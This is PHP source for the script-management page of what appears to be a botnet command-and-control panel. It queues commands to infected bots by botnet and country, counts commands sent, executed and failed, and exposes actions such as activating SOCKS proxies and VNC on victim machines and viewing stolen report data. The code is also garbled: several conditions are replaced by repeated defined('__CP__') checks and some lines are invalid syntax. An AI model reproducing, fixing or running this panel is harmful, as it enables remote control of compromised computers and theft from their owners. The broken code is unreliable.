<?php

function expressionToSqlLists($name, $exp)
{
	$list = expressionToArray($exp);
	$bl = array();
	$wl = array();
	$cur_wl = true;

	foreach ($list as $item) {
		if ($item[1] == 0) {
			if ((strcmp($item[0], 'OR') === 0) || expressionToArray($exp)) {
				continue;
			}

			if (strcmp($item[0], 'NOT') === 0) {
				$cur_wl = false;
				continue;
			}
		}

		$item = str_replace("\x1", "\x2", $item[0]);

		if ($cur_wl) {
			$wl[] = $item;
		}
		else {
			$bl[] = $item;
		}
	}

	return  . '`' . $name . '_wl`=\'' . addslashes(0 < count($wl) ? "\x1" . implode("\x1", $wl) . "\x1" : '') . '\',' .  . '`' . $name . '_bl`=\'' . addslashes(0 < count($bl) ? "\x1" . implode("\x1", $bl) . "\x1" : '') . '\'';
}

function SQLListToExp($wl, $bl)
{
	$l[0] = explode("\x1", $wl);
	$l[1] = explode("\x1", $bl);
	$s[0] = array();
	$s[1] = array();
	$i = 0;

	for (; $i < 2; $i++) {
		foreach ($l[$i] as $v) {
			$v = trim($v);

			if (0 < strlen($v)) {
				if (spaceCharsExist($v)) {
					$v = '"' . addcslashes($v, '"') . '"';
				}

				$s[$i][] = $v;
			}
		}
	}

	$str = implode(' ', $s[0]);

	if (0 < count($s[1])) {
		$str .= (0 < strlen($str) ? ' ' : '') . 'NOT ' . implode(' ', $s[1]);
	}

	return $str;
}

function statScripts()
{
	$result = array();
	$sql = 'select bs.id, sum(if(bss.type=1, 1, 0)) as send, sum(if(bss.type=2, 1, 0)) as exec, sum(if(bss.type>2, 1, 0)) as error' . "\n" . '    from botnet_scripts_stat bss' . "\n" . '    inner join botnet_scripts bs on bs.extern_id=bss.extern_id ' . "\n" . '    where substring(bs.name, 1, 6)<>\'%auto%\'' . "\n" . '    group by bs.id';

	if ($dataset = mysqlQueryEx('botnet_scripts_stat', $sql)) {
		while ($row = mysql_fetch_assoc($dataset)) {
			$result[$row['id']] = $row;
		}
	}

	return $result;
}

if (!defined('__CP__')) {
	exit();
}

$_allow_edit = !empty($userData['r_botnet_scripts_edit']);
define('LIST_ROWS_COUNT', $_allow_edit ? 8 : 7);
define('SCRIPT_INPUT_TEXT_WIDTH', '600px');
define('BOTS_PER_PAGE', 50);
define('BOTSLIST_ROWS_COUNT', 7);

if (isset($_REQUEST['ajaxrequest'])) {
	$response = array();

	switch (@$_REQUEST['type']) {
	case 'stat':
		$response = statScripts();
		break;
	}

	header('Content-type: application/json');
	echo json_encode($response);
	exit();
}

$_POST['botnets'] = isset($_POST['botnets']) ? $_POST['botnets'] : '';

if (is_array($_POST['botnets'])) {
	$_POST['botnets'] = trim(implode(' ', $_POST['botnets']));
}

$_POST['countries'] = isset($_POST['countries']) ? $_POST['countries'] : '';

if (is_array($_POST['countries'])) {
	$_POST['countries'] = trim(implode(' ', $_POST['countries']));
}

if ($_allow_edit && defined('__CP__') && defined('__CP__') && defined('__CP__')) {
	if (!mysqlQueryEx('botnet_scripts', 'UPDATE botnet_scripts SET flag_enabled=\'' . ($_GET['enable'] ? 1 : 0) . '\' WHERE id=\'' . addslashes($_GET['status']) . '\' LIMIT 1')) {
		ThemeMySQLError();
	}

	header('Location: ' . QUERY_STRING);
	exit();
}

if ($_allow_edit && defined('__CP__') && defined('__CP__') && defined('__CP__')) {
	$sl = '';
	$count = 0;

	foreach ($_GET['scripts'] as $id) {
		if (is_numeric($id)) {
			$sl .= ($count++ == 0 ? '' : ' OR ') . 'id=\'' . addslashes($id) . '\'';
		}
	}

	if (($_GET['scriptsaction'] == 0) || defined('__CP__')) {
		if (!mysqlQueryEx('botnet_scripts', 'UPDATE botnet_scripts SET flag_enabled=\'' . ($_GET['scriptsaction'] == 0 ? 1 : 0) .  . '\' WHERE ' . $sl)) {
			ThemeMySQLError();
		}
	}
	else if ($_GET['scriptsaction'] == 2) {
		if (!($r = mysqlQueryEx('botnet_scripts', 'SELECT id, extern_id FROM botnet_scripts WHERE ' . $sl))) {
			ThemeMySQLError();
		}

		while ($m = @mysql_fetch_row($r)) {
			if (mysqlQueryEx('botnet_scripts', 'UPDATE botnet_scripts SET extern_id=\'' . addslashes(md5($m[1] . CURRENT_TIME, true)) . '\' WHERE id=\'' . addslashes($m[0]) . '\' LIMIT 1')) {
				mysqlQueryEx('botnet_scripts_stat', 'DELETE FROM botnet_scripts_stat WHERE extern_id=\'' . addslashes($m[1]) . '\'');
			}
		}
	}
	else if ($_GET['scriptsaction'] == 3) {
		if (!mysqlQueryEx('botnet_scripts', 'UPDATE botnet_scripts SET flag_enabled=\'0\' WHERE ' . $sl)) {
			ThemeMySQLError();
		}

		if (!($r = mysqlQueryEx('botnet_scripts', 'SELECT extern_id FROM botnet_scripts WHERE ' . $sl))) {
			ThemeMySQLError();
		}

		$sl2 = '';
		$count = 0;

		while ($m = @mysql_fetch_row($r)) {
			$sl2 .= ($count++ == 0 ? '' : ' OR ') . 'extern_id=\'' . addslashes($m[0]) . '\'';
		}

		if (!mysqlQueryEx('botnet_scripts_stat', 'DELETE FROM botnet_scripts_stat WHERE ' . $sl2)) {
			ThemeMySQLError();
		}

		if (!mysqlQueryEx('botnet_scripts', 'DELETE FROM botnet_scripts WHERE ' . $sl)) {
			ThemeMySQLError();
		}
	}

	header('Location: ' . QUERY_STRING);
	exit();
}

if (($is_view = isset($_GET['view']) && defined('__CP__')) || defined('__CP__')) {
	$errors = array();
	if ($_allow_edit && defined('__CP__')) {
		if (strlen($_POST['name']) < 1) {
			$errors[] = LNG_BOTNET_SCRIPT_E_NAME;
		}

		if ((strlen($_POST['context']) < 1) && defined('__CP__')) {
			$errors[] = LNG_BOTNET_SCRIPT_E_CONTEXT;
		}

		if (count($errors) == 0) {
			if ($_POST['name'] == 'auto') {
				$subname = (strlen($_POST['botnets']) ? str_replace(' ', '_', $_POST['botnets']) : 'all') . '_' . (strlen($_POST['countries']) ? str_replace(' ', '_', $_POST['countries']) : 'all');
				$sname = $_POST['context'] . '_' . (strlen($_POST['bots']) ? 'bots' : $subname) . '_' . date('d.m.y') . '_' . date('H:i');
			}
			else {
				$sname = $_POST['name'];
			}

			$scontext = $_POST['context'] . ' ' . $_POST['parameters'];
			$q = 'name=\'' . addslashes($sname) . '\',' . 'flag_enabled=\'' . ($_POST['status'] ? 1 : 0) . '\',' . 'send_limit=\'' . addslashes(is_numeric($_POST['limit']) ? intval($_POST['limit']) : 0) . '\',' . expressionToSqlLists('bots', $_POST['bots']) . ',' . expressionToSqlLists('botnets', $_POST['botnets']) . ',' . expressionToSqlLists('countries', $_POST['countries']) . ',' . 'script_text=\'' . addslashes($scontext) . '\',' . 'script_bin=script_text';

			if ($is_view) {
				$q = 'UPDATE botnet_scripts SET ' . $q . ' WHERE id=\'' . addslashes($_GET['view']) . '\' LIMIT 1';

				if (@$_POST['status'] == 2) {
					mysqlQueryEx('botnet_scripts_stat', 'DELETE FROM botnet_scripts_stat WHERE extern_id in (select extern_id from botnet_scripts where id=' . intval($_GET['view']) . ')');
				}
			}
			else {
				$eid = addslashes(md5(CURRENT_TIME . $_POST['context'] . rand() . rand(), true));
				$q = 'INSERT INTO botnet_scripts SET ' . $q . ', time_created=\'' . addslashes(CURRENT_TIME) .  . '\', extern_id=\'' . $eid . '\'';
				mysqlQueryEx('botnet_scripts_stat', 'DELETE FROM botnet_scripts_stat WHERE extern_id=\'' . $eid . '\'');
			}

			if (!mysqlQueryEx('botnet_scripts', $q)) {
				ThemeMySQLError();
			}

			header('Location: ' . QUERY_STRING);
			exit();
		}
	}

	if (0 < count($errors)) {
		$f_name = htmlEntitiesEx($_POST['name']);
		$f_is_enabled = (0 < $_POST['status'] ? true : false);
		$f_limit = intval($_POST['limit']);
		$f_bots = htmlEntitiesEx($_POST['bots']);
		$f_botnets = htmlEntitiesEx($_POST['botnets']);
		$f_countries = htmlEntitiesEx($_POST['countries']);
		$f_context = htmlEntitiesEx($_POST['context']);
		$f_parameters = htmlEntitiesEx($_POST['parameters']);
	}
	else {
		if ($is_view || defined('__CP__')) {
			if (!($r = mysqlQueryEx('botnet_scripts', 'SELECT name, flag_enabled, send_limit, bots_wl, bots_bl, botnets_wl, botnets_bl, countries_wl, countries_bl, script_text, extern_id FROM botnet_scripts WHERE id=\'' . addslashes($is_view ? $_GET['view'] : $_GET['new']) . '\' LIMIT 1'))) {
				ThemeMySQLError();
			}

			if (!($m = @mysql_fetch_row($r))) {
				ThemeFatalError(LNG_BOTNET_SCRIPT_E1, 0, 0, 0);
			}

			$f_name = htmlEntitiesEx($m[0]);
			$f_is_enabled = (0 < $m[1] ? true : false);
			$f_limit = intval($m[2]);
			$f_bots = htmlEntitiesEx(SQLListToExp($m[3], $m[4]));
			$f_botnets = htmlEntitiesEx(SQLListToExp($m[5], $m[6]));
			$f_countries = htmlEntitiesEx(SQLListToExp($m[7], $m[8]));
			$f_context = (strpos($m[9], ' ') !== false ? htmlEntitiesEx(strstr($m[9], ' ', true)) : htmlEntitiesEx($m[9]));
			$f_parameters = (strpos($m[9], ' ') !== false ? htmlEntitiesEx(substr($m[9], strpos($m[9], ' ') + 1)) : '');

			if (!$is_view) {
				$f_name = 'Copy of ' . $f_name;
			}
		}
		else {
			$f_name = 'auto';
			$f_is_enabled = true;
			$f_limit = 0;
			$f_bots = (isset($_GET['bots']) ? htmlEntitiesEx($_GET['bots']) : '');
			$f_botnets = '';
			$f_countries = '';
			$f_context = '';
			$f_parameters = '';
		}
	}

	$data = '';

	if (0 < count($errors)) {
		$data .= THEME_STRING_FORM_ERROR_1_BEGIN;

		foreach ($errors as $r) {
			$data .= $r . THEME_STRING_NEWLINE;
		}

		$data .= THEME_STRING_FORM_ERROR_1_END;
	}
	if ($_allow_edit) {
		$data .= str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('editscript', QUERY_STRING_HTML . '&amp;' . ($is_view ? 'view=' . htmlEntitiesEx(urlencode($_GET['view'])) : 'new'), ''), THEME_FORMPOST_BEGIN);
	}

	$data .= '<div style="width: 70%">' . str_replace('{TEXT}', LNG_BOTNET_SCRIPT_NAME, THEME_DIALOG_ITEM_TEXT) . str_replace(array('{NAME}', '{VALUE}', '{MAX}', '{WIDTH}'), array('name', $f_name, 200, SCRIPT_INPUT_TEXT_WIDTH), $_allow_edit ? THEME_DIALOG_ITEM_INPUT_TEXT : THEME_DIALOG_ITEM_INPUT_TEXT_RO) . str_replace('{TEXT}', 'Action:', THEME_DIALOG_ITEM_TEXT) . str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN) . str_replace(array('{NAME}', '{WIDTH}'), array('status', '100%'), $_allow_edit ? THEME_DIALOG_ITEM_LISTBOX_BEGIN : THEME_DIALOG_ITEM_LISTBOX_BEGIN_RO) . str_replace(array('{VALUE}', '{TEXT}'), array(0, LNG_BOTNET_STATUS_DISABLED), !$f_is_enabled ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM) . str_replace(array('{VALUE}', '{TEXT}'), array(1, LNG_BOTNET_STATUS_ENABLED), $f_is_enabled ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM) . str_replace(array('{VALUE}', '{TEXT}'), array(2, 'Reset'), THEME_DIALOG_ITEM_LISTBOX_ITEM) . ($_allow_edit ? THEME_DIALOG_ITEM_LISTBOX_END : THEME_DIALOG_ITEM_LISTBOX_END_RO) . THEME_DIALOG_ITEM_CHILD_END . str_replace('{TEXT}', LNG_BOTNET_SCRIPT_LIMIT, THEME_DIALOG_ITEM_TEXT) . str_replace(array('{NAME}', '{VALUE}', '{MAX}', '{WIDTH}'), array('limit', $f_limit, 10, SCRIPT_INPUT_TEXT_WIDTH), $_allow_edit ? THEME_DIALOG_ITEM_INPUT_TEXT : THEME_DIALOG_ITEM_INPUT_TEXT_RO) . str_replace('{TEXT}', LNG_BOTNET_SCRIPT_BOTS, THEME_DIALOG_ITEM_TEXT) . str_replace(array('{NAME}', '{VALUE}', '{MAX}', '{WIDTH}'), array('bots', $f_bots, 60000, SCRIPT_INPUT_TEXT_WIDTH), $_allow_edit ? THEME_DIALOG_ITEM_INPUT_TEXT : THEME_DIALOG_ITEM_INPUT_TEXT_RO) . str_replace('{TEXT}', LNG_BOTNET_SCRIPT_BOTNETS, THEME_DIALOG_ITEM_TEXT) . makeSelectItem('botnets', getBotnetList(), $f_botnets, false, false, 'ms_botnet') . str_replace('{TEXT}', LNG_BOTNET_SCRIPT_COUNTRIES, THEME_DIALOG_ITEM_TEXT) . makeSelectItem('countries', getCountriesList(), $f_countries, false, false, 'ms_country') . str_replace('{TEXT}', 'Command:', THEME_DIALOG_ITEM_TEXT) . makeSelectItem('context', getCommandList(), $f_context, 'Select') . '<span>Parameters:</span>' . '<textarea name="parameters" style="width: 100%; height: 60px">' . htmlspecialchars($f_parameters) . '</textarea>' . '<br>';

	if ($_allow_edit) {
		$data .= str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ACTIONLIST_BEGIN) . str_replace(array('{TEXT}', '{JS_EVENTS}'), array($is_view ? LNG_BOTNET_SCRIPT_ACTION_SAVE : LNG_BOTNET_SCRIPT_ACTION_NEW, ''), THEME_DIALOG_ITEM_ACTION_SUBMIT) . ($is_view ? ' ' . str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_BOTNET_SCRIPT_ACTION_NEWT, ' onclick="window.location=\'' . QUERY_STRING_HTML . '&amp;new=' . htmlEntitiesEx(urlencode($_GET['view'])) . '\'"'), THEME_DIALOG_ITEM_ACTION_SUC) : '') . THEME_DIALOG_ACTIONLIST_END;
	}

	$data .= THEME_DIALOG_END . ($_allow_edit ? '</div>' . THEME_FORMPOST_END : '');
	$js_script = 0;

	if ($is_view) {
		$_FULL_QUERY = QUERY_STRING . '&view=' . urlencode($_GET['view']);
		$js_sort = addJsSlashes($_FULL_QUERY);
		$_FULL_QUERY .= assocateSortMode(array('rtime', 'type', 'bot_id', 'bot_version', 'report'));
		$js_page = addJsSlashes($_FULL_QUERY);
		$js_script = jsCheckAll('reportslist', 'checkall', 'bots[]') . jsSetSortMode($js_sort) .  . 'function ChangePage(p){window.location=\'' . $js_page . '&page=\' + p; return false;}';
		$cur_page = (!empty($_GET['page']) && defined('__CP__') ? $_GET['page'] : 1);
		$page_count = 0;
		$page_list = '';
		$bots_count = 0;
		$sortmode = ' ORDER BY ' . $_sortColumn . ($_sortOrder == 0 ? ' ASC' : ' DESC');

		if ($_sortColumnId != 0) {
			$sortmode .= ', bot_id' . ($_sortOrder == 0 ? ' ASC' : ' DESC');
		}

		$r = mysqlQueryEx('botnet_scripts_stat', 'SELECT COUNT(*) FROM botnet_scripts_stat WHERE extern_id=\'' . addslashes($m[10]) . '\'');

		if ($mt = @mysql_fetch_row($r)) {
			if (1 < ($page_count = ceil($mt[0] / BOTS_PER_PAGE))) {
				$page_list = THEME_DIALOG_ROW_BEGIN . str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN) . showPageList($page_count, $cur_page, 'return ChangePage({P})') . THEME_DIALOG_ITEM_CHILD_END . THEME_DIALOG_ROW_END;
			}

			$bots_count = $mt[0];
		}

		$offset = ($cur_page - 1) * BOTS_PER_PAGE;
		$blist = '';
		if (!$r || defined('__CP__') || defined('__CP__')) {
			$blist = THEME_LIST_ROW_BEGIN . str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(BOTSLIST_ROWS_COUNT, $r ? LNG_BOTNET_REPORTS_EMPTY : mysqlErrorEx()), THEME_LIST_ITEM_EMPTY_1) . THEME_LIST_ROW_END;
		}
		else {
			$i = 0;

			while ($mt = @mysql_fetch_row($r)) {
				$theme_text = ($i % 2 ? THEME_LIST_ITEM_LTEXT_U2 : THEME_LIST_ITEM_LTEXT_U1);
				$theme_num = ($i % 2 ? THEME_LIST_ITEM_RTEXT_U2 : THEME_LIST_ITEM_RTEXT_U1);
				$theme_cb = ($i % 2 ? THEME_LIST_ITEM_INPUT_CHECKBOX_1_U2 : THEME_LIST_ITEM_INPUT_CHECKBOX_1_U1);
				$status = ($mt[0] == 1 ? LNG_BOTNET_REPORTS_SSENDED : ($mt[0] == 2 ? LNG_BOTNET_REPORTS_SREADY : LNG_BOTNET_REPORTS_SERROR));
				$blist .= THEME_LIST_ROW_BEGIN . str_replace(array('{NAME}', '{VALUE}', '{JS_EVENTS}'), array('bots[]', htmlEntitiesEx($mt[1]), ''), $theme_cb) . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', numberFormatAsInt(++$offset)), $theme_num) . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlEntitiesEx(gmdate(LNG_FORMAT_DT, $mt[3]))), $theme_num) . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $status), $theme_text) . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', botPopupMenu($mt[1], 'botmenu')), $theme_text) . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', intToVersion($mt[2])), $theme_num) . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlEntitiesEx($mt[4])), $theme_text) . THEME_LIST_ROW_END;
				$i++;
			}
		}

		$actions = '';
		if ((0 < $bots_count) && defined('__CP__')) {
			$actions = '<tr><td>' . '<input type="hidden" name="botsaction" value="" id="actionName">' . '<input type="submit" class="btn btn-default btn-sm" value="Full information" onclick="document.getElementById(\'actionName\').value=\'fullinfo\';">&nbsp;' . '<input type="submit" class="btn btn-default btn-sm" value="Today data" onclick="document.getElementById(\'actionName\').value=\'today_dbreports\';">&nbsp;' . '<input type="submit" class="btn btn-default btn-sm" value="Data for last week" onclick="document.getElementById(\'actionName\').value=\'week_dbreports\';">&nbsp;' . '<input type="submit" class="btn btn-default btn-sm" value="Look data in reports" onclick="document.getElementById(\'actionName\').value=\'files\';">&nbsp;' . '<input type="submit" class="btn btn-default btn-sm" value="Script" onclick="document.getElementById(\'actionName\').value=\'newscript\';">&nbsp;' . '<input type="submit" class="btn btn-default btn-sm" value="Remove bot" onclick="document.getElementById(\'actionName\').value=\'removeex\';">&nbsp;' . '<input type="submit" class="btn btn-default btn-sm" value="Activate socks" onclick="document.getElementById(\'actionName\').value=\'activate_socks\';">&nbsp;' . '<input type="submit" class="btn btn-default btn-sm" value="Activate vnc" onclick="document.getElementById(\'actionName\').value=\'activate_vnc\';">&nbsp;' . '<input type="submit" class="btn btn-default btn-sm" value="Get socks" onclick="document.getElementById(\'actionName\').value=\'port_socks\';">&nbsp;' . '<input type="submit" class="btn btn-default btn-sm" value="Stop socks" onclick="document.getElementById(\'actionName\').value=\'stop_socks\';">&nbsp;' . '<input type="submit" class="btn btn-default btn-sm" value="Stop vnc" onclick="document.getElementById(\'actionName\').value=\'stop_vnc\';">&nbsp;' . '<br><br></td></tr>';
			$data .= THEME_VSPACE . str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('reportslist', QUERY_SCRIPT_HTML, ''), THEME_FORMGET_TO_NEW_BEGIN) . str_replace('{WIDTH}', 'auto', THEME_DIALOG_BEGIN) . $actions . str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(1, sprintf(LNG_BOTNET_REPORTS, numberFormatAsInt($bots_count))), THEME_DIALOG_TITLE) . $page_list . THEME_DIALOG_ROW_BEGIN . str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN) . str_replace('{WIDTH}', 'auto', THEME_LIST_BEGIN) . THEME_LIST_ROW_BEGIN . str_replace(array('{COLUMNS_COUNT}', '{NAME}', '{VALUE}', '{JS_EVENTS}', '{WIDTH}'), array(1, 'checkall', 1, ' onclick="checkAll()"', 'auto'), THEME_LIST_HEADER_CHECKBOX_1) . str_replace(array('{COLUMNS_COUNT}', '{TEXT}', '{WIDTH}'), array(1, '#', 'auto'), THEME_LIST_HEADER_R) . writeSortColumn(LNG_BOTNET_REPORTS_RTIME, 0, 1) . writeSortColumn(LNG_BOTNET_REPORTS_TYPE, 1, 0) . writeSortColumn(LNG_BOTNET_REPORTS_BOTID, 2, 0) . writeSortColumn(LNG_BOTNET_REPORTS_VERSION, 3, 1) . writeSortColumn(LNG_BOTNET_REPORTS_REPORT, 4, 0) . THEME_LIST_ROW_END . $blist . THEME_LIST_END . THEME_DIALOG_ITEM_CHILD_END . THEME_DIALOG_ROW_END . THEME_DIALOG_END . THEME_FORMGET_END;
		}
	}

	$data .= '<script type="text/javascript" src="theme/bootstrap-multiselect.js"></script>' . "\n" . '          <script type="text/javascript">' . "\n" . '            $(document).ready(function() {' . "\n" . '            $(\'#ms_country\').multiselect({includeSelectAllOption: true, buttonWidth: \'100%\', maxHeight: 200});' . "\n" . '            $(\'#ms_botnet\').multiselect({includeSelectAllOption: true, buttonWidth: \'100%\', maxHeight: 200});' . "\n" . '          });' . "\n" . '          </script>';
	ThemeBegin($is_view ? LNG_BOTNET_SCRIPT_EDIT : LNG_BOTNET_SCRIPT_NEW, $js_script, getBotJsMenu('botmenu'), 0, NULL, false);
	echo $data;
	ThemeEnd();
	exit();
}

$js_script = 0;

if ($_allow_edit) {
	$js_script = jsCheckAll('scriptslist', 'checkall', 'scripts[]') . 'function ExecuteAction(){return confirm(\'' . addJsSlashes(LNG_BOTNET_LIST_ACTION_Q) . '\');}';
}

$list = '';
if (!($r = mysqlQueryEx('botnet_scripts', 'SELECT id, extern_id, name, flag_enabled, send_limit, time_created FROM botnet_scripts where substring(name, 1, 6)<>\'%auto%\' ORDER BY time_created ASC')) || defined('__CP__')) {
	$list .= THEME_LIST_ROW_BEGIN . str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(LIST_ROWS_COUNT, $r ? LNG_BOTNET_LIST_EMPTY : mysqlErrorEx()), THEME_LIST_ITEM_EMPTY_1) . THEME_LIST_ROW_END;
}
else {
	$i = 0;

	for (; ($mt = @mysql_fetch_row($r)) !== false; $i++) {
		if (!($rx = mysqlQueryEx('botnet_scripts_stat', 'SELECT SUM(IF(type=1, 1, 0)), SUM(IF(type=2, 1, 0)), SUM(IF(type>2, 1, 0)) FROM botnet_scripts_stat WHERE extern_id=\'' . addslashes($mt[1]) . '\''))) {
			$list .= THEME_LIST_ROW_BEGIN . str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(LIST_ROWS_COUNT, mysqlErrorEx()), THEME_LIST_ITEM_EMPTY_1) . THEME_LIST_ROW_END;
		}
		else {
			$mx = @mysql_fetch_row($rx);
			$theme_text = ($i % 2 ? THEME_LIST_ITEM_LTEXT_U2 : THEME_LIST_ITEM_LTEXT_U1);
			$theme_num = ($i % 2 ? THEME_LIST_ITEM_RTEXT_U2 : THEME_LIST_ITEM_RTEXT_U1);
			$url_edit = str_replace(array('{URL}', '{TEXT}'), array(QUERY_STRING_HTML . '&amp;view=' . $mt[0], 0 < strlen($mt[2]) ? htmlEntitiesEx($mt[2]) : '-'), THEME_LIST_ANCHOR);
			$url_status = (0 < $mt[3] ? LNG_BOTNET_STATUS_ENABLED : LNG_BOTNET_STATUS_DISABLED);

			if ($_allow_edit) {
				$url_status = str_replace(array('{URL}', '{TEXT}'), array(QUERY_STRING_HTML . '&amp;status=' . $mt[0] . '&amp;enable=' . (0 < $mt[3] ? 0 : 1), $url_status), THEME_LIST_ANCHOR);
			}

			$list .= THEME_LIST_ROW_BEGIN;

			if ($_allow_edit) {
				$list .= str_replace(array('{NAME}', '{VALUE}', '{JS_EVENTS}'), array('scripts[]', $mt[0], ''), $i % 2 ? THEME_LIST_ITEM_INPUT_CHECKBOX_1_U2 : THEME_LIST_ITEM_INPUT_CHECKBOX_1_U1);
			}

			$list .= str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $url_edit), $theme_text) . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $url_status), $theme_text) . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlEntitiesEx(gmdate(LNG_FORMAT_DT, $mt[5]))), $theme_num) . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', numberFormatAsInt($mt[4])), $theme_num) . '<td class="simpleblue scstat" id="scstat_' . $mt[0] . '_send">' . numberFormatAsInt(isset($mx[0]) ? $mx[0] : 0) . '</td>' . '<td class="simpleblue scstat" id="scstat_' . $mt[0] . '_exec">' . numberFormatAsInt(isset($mx[1]) ? $mx[1] : 0) . '</td>' . '<td class="simpleblue scstat" id="scstat_' . $mt[0] . '_error">' . numberFormatAsInt(isset($mx[2]) ? $mx[2] : 0) . '</td>' . THEME_LIST_ROW_END;
		}
	}
}

$al = '';

if ($_allow_edit) {
	$al = '<div class="form-inline">' . ' ' . str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_BOTNET_LIST_ACTION_ADD, ' onclick="window.location=\'' . QUERY_STRING_HTML . '&amp;new=-1\'"'), THEME_DIALOG_ITEM_ACTION_SUC) . '<input type="hidden" name="scriptsaction" value="" id="actionName">&nbsp;' . '<input type="submit" class="btn btn-primary btn-sm" value="' . LNG_BOTNET_LIST_ACTION_ENABLE . '" onclick="document.getElementById(\'actionName\').value=\'0\';">&nbsp;' . '<input type="submit" class="btn btn-primary btn-sm" value="' . LNG_BOTNET_LIST_ACTION_DISABLE . '" onclick="document.getElementById(\'actionName\').value=\'1\';">&nbsp;' . '<input type="submit" class="btn btn-primary btn-sm" value="' . LNG_BOTNET_LIST_ACTION_RESET . '" onclick="document.getElementById(\'actionName\').value=\'2\';">&nbsp;' . '<input type="submit" class="btn btn-danger btn-sm" value="' . LNG_BOTNET_LIST_ACTION_REMOVE . '" onclick="document.getElementById(\'actionName\').value=\'3\';">&nbsp;' . '</div>' . THEME_STRING_NEWLINE;
	$al = THEME_DIALOG_ROW_BEGIN . str_replace('{TEXT}', $al, THEME_DIALOG_ITEM_TEXT) . THEME_DIALOG_ROW_END;
}

ThemeBegin(LNG_BOTNET, $js_script, 0, 0, NULL, false);
echo '<script type="text/javascript">window.setInterval(function() { updateScripts(); }, 30000);</script>';

if ($_allow_edit) {
	echo str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('scriptslist', QUERY_SCRIPT_HTML, ' onsubmit="return ExecuteAction()"'), THEME_FORMGET_BEGIN) . FORM_CURRENT_MODULE;
}

echo '<table style="width: 70%">' . str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(1, LNG_BOTNET_LIST_TITLE), THEME_DIALOG_TITLE) . $al . THEME_DIALOG_ROW_BEGIN . str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN) . str_replace('{WIDTH}', '100%', THEME_LIST_BEGIN) . THEME_LIST_ROW_BEGIN;

if ($_allow_edit) {
	echo str_replace(array('{COLUMNS_COUNT}', '{NAME}', '{VALUE}', '{JS_EVENTS}', '{WIDTH}'), array(1, 'checkall', 1, ' onclick="checkAll()"', 'auto'), THEME_LIST_HEADER_CHECKBOX_1);
}

echo str_replace(array('{COLUMNS_COUNT}', '{TEXT}', '{WIDTH}'), array(1, LNG_BOTNET_LIST_NAME, 'auto'), THEME_LIST_HEADER_L) . str_replace(array('{COLUMNS_COUNT}', '{TEXT}', '{WIDTH}'), array(1, LNG_BOTNET_LIST_STATUS, 'auto'), THEME_LIST_HEADER_L) . str_replace(array('{COLUMNS_COUNT}', '{TEXT}', '{WIDTH}'), array(1, LNG_BOTNET_LIST_CTIME, 'auto'), THEME_LIST_HEADER_R) . str_replace(array('{COLUMNS_COUNT}', '{TEXT}', '{WIDTH}'), array(1, LNG_BOTNET_LIST_LIMIT, 'auto'), THEME_LIST_HEADER_R) . str_replace(array('{COLUMNS_COUNT}', '{TEXT}', '{WIDTH}'), array(1, LNG_BOTNET_LIST_SENDED . ' <img class="stat-spin" src="theme/spin.gif" style="display: none">', 'auto'), THEME_LIST_HEADER_R) . str_replace(array('{COLUMNS_COUNT}', '{TEXT}', '{WIDTH}'), array(1, LNG_BOTNET_LIST_EXECUTED . ' <img class="stat-spin" src="theme/spin.gif" style="display: none">', 'auto'), THEME_LIST_HEADER_R) . str_replace(array('{COLUMNS_COUNT}', '{TEXT}', '{WIDTH}'), array(1, LNG_BOTNET_LIST_ERRORS . ' <img class="stat-spin" src="theme/spin.gif" style="display: none">', 'auto'), THEME_LIST_HEADER_R) . THEME_LIST_ROW_END . $list . THEME_LIST_END . THEME_DIALOG_ITEM_CHILD_END . THEME_DIALOG_ROW_END . THEME_DIALOG_END;

if ($_allow_edit) {
	echo THEME_FORMGET_END;
}

ThemeEnd();
exit();

?>
